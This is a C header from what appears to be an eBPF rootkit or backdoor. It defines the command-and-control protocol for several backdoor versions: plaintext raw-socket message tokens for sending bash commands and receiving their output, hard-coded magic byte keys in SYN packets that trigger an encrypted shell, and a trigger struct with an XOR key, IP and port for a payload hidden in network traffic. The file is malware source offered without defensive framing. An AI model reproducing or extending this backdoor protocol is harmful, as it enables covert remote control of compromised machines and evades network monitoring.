#ifndef __BPF_CC_H
#define __BPF_CC_H

//C&C V0 & V1 --> Unencrypted transmission with RAW sockets, no TCP conn
//Protocol messages are also used in the secure channel of V2 & V3 backdoor
#define CC_PROT_SYN "CC_SYN"
#define CC_PROT_ACK "CC_ACK"
#define CC_PROT_MSG "CC_MSG#"
#define CC_PROT_FIN_PART "CC_FIN"
#define CC_PROT_ERR "CC_ERR"
#define CC_PROT_FIN CC_PROT_MSG CC_PROT_FIN_PART
#define CC_PROT_BASH_COMMAND_REQUEST "CC_COMM_RQ#"
#define CC_PROT_BASH_COMMAND_RESPONSE "CC_COMM_RS#"

//C&C V1 & V2 --> bpv47-like trigger + encrypted shell in V2
#define CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE 0x10
#define CC_TRIGGER_SYN_PACKET_KEY_1 "\x56\xA4"
#define CC_TRIGGER_SYN_PACKET_KEY_2 "\x78\x13"
#define CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL "\x1F\x29"
#define CC_TRIGGER_SYN_PACKET_SECTION_LEN 0x02

#define CC_PROT_COMMAND_ENCRYPTED_SHELL 0

//C&C V3 -- Distributed hidden payload in packet stream
struct trigger_t {
    unsigned char xor_key;
    unsigned int ip;
    short unsigned int port;
    unsigned char pad1;
    short unsigned int pad2;
    short unsigned int crc;
};


#endif